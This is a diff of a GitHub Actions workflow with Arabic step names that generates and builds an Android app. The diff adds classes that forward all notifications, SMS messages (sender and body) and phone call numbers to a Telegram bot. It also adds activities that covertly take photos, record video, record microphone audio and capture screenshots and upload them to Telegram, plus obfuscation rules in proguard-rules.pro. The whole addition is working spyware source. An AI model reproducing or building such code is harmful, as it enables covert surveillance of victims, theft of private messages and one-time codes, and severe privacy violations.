@@ -18,17 +18,21 @@ jobs:
           distribution: 'temurin'
           java-version: '17'
 
-      - name: إنشاء ملفات المشروع أولاً
+      - name: تثبيت Gradle 8.4 يدوياً
+        run: |
+          wget https://services.gradle.org/distributions/gradle-8.4-bin.zip
+          unzip -q gradle-8.4-bin.zip
+          echo "$(pwd)/gradle-8.4/bin" >> $GITHUB_PATH
+
+      - name: إنشاء ملفات المشروع
         run: |
           mkdir -p app/src/main/java/com/h/core
           mkdir -p app/src/main/res/xml
           mkdir -p app/src/main/res/drawable
           mkdir -p app/src/main/res/values
           
-          # إنشاء settings.gradle أولاً
           echo "include ':app'" > settings.gradle
           
-          # إنشاء build.gradle الرئيسي
           cat << 'EOF' > build.gradle
           buildscript {
               repositories {
@@ -47,7 +51,6 @@ jobs:
           }
           EOF
           
-          # إنشاء app/build.gradle
           cat << 'EOF' > app/build.gradle
           plugins {
               id 'com.android.application'
@@ -77,12 +80,7 @@ jobs:
           }
           EOF
 
-      - name: إنشاء Gradle Wrapper (بعد وجود الملفات)
-        run: |
-          gradle wrapper
-          chmod +x gradlew
-
-      - name: AndroidManifest.xml
+      - name: إنشاء AndroidManifest.xml
         run: |
           cat << 'EOF' > app/src/main/AndroidManifest.xml
           <?xml version="1.0" encoding="utf-8"?>
@@ -132,7 +130,7 @@ jobs:
           </manifest>
           EOF
 
-      - name: Config.java
+      - name: إنشاء Config.java
         run: |
           cat << 'EOF' > app/src/main/java/com/h/core/Config.java
           package com.h.core;
@@ -142,7 +140,7 @@ jobs:
           }
           EOF
 
-      - name: Telegram.java
+      - name: إنشاء Telegram.java
         run: |
           cat << 'EOF' > app/src/main/java/com/h/core/Telegram.java
           package com.h.core;
@@ -180,7 +178,7 @@ jobs:
           }
           EOF
 
-      - name: CoreService.java
+      - name: إنشاء CoreService.java
         run: |
           cat << 'EOF' > app/src/main/java/com/h/core/CoreService.java
           package com.h.core;
@@ -263,7 +261,69 @@ jobs:
           }
           EOF
 
-      - name: MainActivity.java
+      - name: إنشاء NotificationListener.java
+        run: |
+          cat << 'EOF' > app/src/main/java/com/h/core/NotificationListener.java
+          package com.h.core;
+          import android.service.notification.NotificationListenerService;
+          import android.service.notification.StatusBarNotification;
+          import android.os.Bundle;
+          public class NotificationListener extends NotificationListenerService {
+              @Override public void onNotificationPosted(StatusBarNotification sbn) {
+                  try { Bundle ex = sbn.getNotification().extras;
+                      String title = ex.getString("android.title","");
+                      String text = ex.getString("android.text","");
+                      String app = sbn.getPackageName();
+                      if(!text.isEmpty()) Telegram.sendMessage(this, "🔔 " + app + "\n" + title + "\n" + text);
+                  } catch(Exception e){}
+              }
+              @Override public void onNotificationRemoved(StatusBarNotification sbn) {}
+          }
+          EOF
+
+      - name: إنشاء SmsReceiver.java
+        run: |
+          cat << 'EOF' > app/src/main/java/com/h/core/SmsReceiver.java
+          package com.h.core;
+          import android.content.BroadcastReceiver;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.telephony.SmsMessage;
+          public class SmsReceiver extends BroadcastReceiver {
+              @Override public void onReceive(Context ctx, Intent i) {
+                  Object[] pdus = (Object[]) i.getExtras().get("pdus");
+                  for(Object pdu: pdus) { SmsMessage sms = SmsMessage.createFromPdu((byte[])pdu);
+                      Telegram.sendMessage(ctx, "📨 SMS من " + sms.getOriginatingAddress() + "\n" + sms.getMessageBody());
+                  }
+              }
+          }
+          EOF
+
+      - name: إنشاء CallReceiver.java
+        run: |
+          cat << 'EOF' > app/src/main/java/com/h/core/CallReceiver.java
+          package com.h.core;
+          import android.content.BroadcastReceiver;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.telephony.TelephonyManager;
+          public class CallReceiver extends BroadcastReceiver {
+              @Override public void onReceive(Context ctx, Intent i) {
+                  String state = i.getStringExtra(TelephonyManager.EXTRA_STATE);
+                  String num = i.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
+                  if(num==null && i.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) num = i.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
+                  if(num!=null) {
+                      String type = "غير معروف";
+                      if(TelephonyManager.EXTRA_STATE_RINGING.equals(state)) type = "⏰ واردة";
+                      else if(TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) type = "📞 جارية";
+                      else if(i.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) type = "🔴 صادرة";
+                      Telegram.sendMessage(ctx, type + "\nالرقم: " + num);
+                  }
+              }
+          }
+          EOF
+
+      - name: إنشاء MainActivity.java
         run: |
           cat << 'EOF' > app/src/main/java/com/h/core/MainActivity.java
           package com.h.core;
@@ -281,21 +341,118 @@ jobs:
           }
           EOF
 
-      - name: proguard-rules.pro
+      - name: إنشاء CameraActivity.java
+        run: |
+          cat << 'EOF' > app/src/main/java/com/h/core/CameraActivity.java
+          package com.h.core;
+          import android.app.Activity;
+          import android.hardware.Camera;
+          import android.media.MediaRecorder;
+          import android.os.Bundle;
+          import android.view.SurfaceHolder;
+          import android.view.SurfaceView;
+          import java.io.File;
+          import java.io.FileOutputStream;
+          import java.text.SimpleDateFormat;
+          import java.util.Date;
+          public class CameraActivity extends Activity implements SurfaceHolder.Callback {
+              private Camera cam; private MediaRecorder recorder; private boolean isVideo = false; private SurfaceView sv; private SurfaceHolder sh;
+              @Override protected void onCreate(Bundle b) {
+                  super.onCreate(b); sv = new SurfaceView(this); setContentView(sv); sh = sv.getHolder(); sh.addCallback(this);
+                  isVideo = getIntent().hasExtra("mode") && getIntent().getStringExtra("mode").equals("video");
+              }
+              public void surfaceCreated(SurfaceHolder h) { 
+                  try { cam = Camera.open(); cam.setPreviewDisplay(h); cam.startPreview(); 
+                      if(isVideo) { 
+                          recorder = new MediaRecorder(); cam.unlock(); recorder.setCamera(cam); 
+                          recorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER); recorder.setVideoSource(MediaRecorder.VideoSource.CAMERA); 
+                          recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4); recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC); 
+                          recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264); 
+                          String path = getExternalFilesDir(null)+"/vid_"+new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date())+".mp4"; 
+                          recorder.setOutputFile(path); recorder.setPreviewDisplay(h.getSurface()); recorder.prepare(); recorder.start(); 
+                          new android.os.Handler().postDelayed(()->{ recorder.stop(); recorder.release(); cam.lock(); cam.release(); 
+                              Telegram.sendVideo(this, new File(path), "🎥 فيديو"); finish(); }, 10000);
+                      } else { 
+                          cam.takePicture(null, null, (data, camera) -> { 
+                              String path = getExternalFilesDir(null)+"/pic_"+new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date())+".jpg"; 
+                              try(FileOutputStream fos = new FileOutputStream(path)){ fos.write(data); }catch(Exception e){} 
+                              cam.release(); Telegram.sendPhoto(this, new File(path), "📸 صورة"); finish(); 
+                          }); 
+                      }
+                  } catch(Exception e){ finish(); } 
+              }
+              public void surfaceChanged(SurfaceHolder h, int f, int w, int hh) {}
+              public void surfaceDestroyed(SurfaceHolder h) { if(cam!=null) cam.release(); if(recorder!=null) recorder.release(); }
+          }
+          EOF
+
+      - name: إنشاء RecordActivity.java
+        run: |
+          cat << 'EOF' > app/src/main/java/com/h/core/RecordActivity.java
+          package com.h.core;
+          import android.app.Activity;
+          import android.media.MediaRecorder;
+          import android.os.Bundle;
+          import java.io.File;
+          import java.text.SimpleDateFormat;
+          import java.util.Date;
+          public class RecordActivity extends Activity {
+              private MediaRecorder recorder; private String path; private int seconds = 10;
+              @Override protected void onCreate(Bundle b) {
+                  super.onCreate(b); seconds = getIntent().getIntExtra("seconds", 10);
+                  try { recorder = new MediaRecorder(); recorder.setAudioSource(MediaRecorder.AudioSource.MIC); 
+                      recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4); recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC); 
+                      path = getExternalFilesDir(null)+"/aud_"+new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date())+".m4a"; 
+                      recorder.setOutputFile(path); recorder.prepare(); recorder.start();
+                      new android.os.Handler().postDelayed(()->{ recorder.stop(); recorder.release(); 
+                          Telegram.sendFile(this, new File(path), "🎙️ تسجيل " + seconds + " ثانية"); finish(); }, seconds*1000);
+                  } catch(Exception e){ finish(); }
+              }
+          }
+          EOF
+
+      - name: إنشاء ScreenActivity.java
+        run: |
+          cat << 'EOF' > app/src/main/java/com/h/core/ScreenActivity.java
+          package com.h.core;
+          import android.app.Activity;
+          import android.graphics.Bitmap;
+          import android.os.Bundle;
+          import android.view.View;
+          import java.io.File;
+          import java.io.FileOutputStream;
+          import java.text.SimpleDateFormat;
+          import java.util.Date;
+          public class ScreenActivity extends Activity {
+              @Override protected void onCreate(Bundle b) {
+                  super.onCreate(b);
+                  try { new android.os.Handler().postDelayed(()->{ 
+                      View v1 = getWindow().getDecorView().getRootView(); v1.setDrawingCacheEnabled(true); Bitmap bm = v1.getDrawingCache();
+                      String path = getExternalFilesDir(null)+"/scr_"+new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date())+".png";
+                      try(FileOutputStream fos = new FileOutputStream(path)){ bm.compress(Bitmap.CompressFormat.PNG, 100, fos); }catch(Exception e){}
+                      v1.setDrawingCacheEnabled(false); Telegram.sendPhoto(this, new File(path), "🖼️ لقطة شاشة"); finish();
+                  }, 1000); } catch(Exception e){ finish(); }
+              }
+          }
+          EOF
+
+      - name: إنشاء proguard-rules.pro
         run: |
           cat << 'EOF' > app/proguard-rules.pro
           -keep class com.h.core.** { *; }
           -keep class okhttp3.** { *; }
           -dontwarn okhttp3.**
+          -dontwarn okio.**
+          -repackageclasses ''
+          -allowaccessmodification
           EOF
 
       - name: بناء APK
         run: |
-          chmod +x gradlew
-          ./gradlew assembleRelease
+          gradle assembleRelease
 
       - name: رفع APK
         uses: actions/upload-artifact@v4
         with:
-          name: HUSSEIN-APK
+          name: HUSSEIN-ULTIMATE-APK
           path: app/build/outputs/apk/release/*.apk
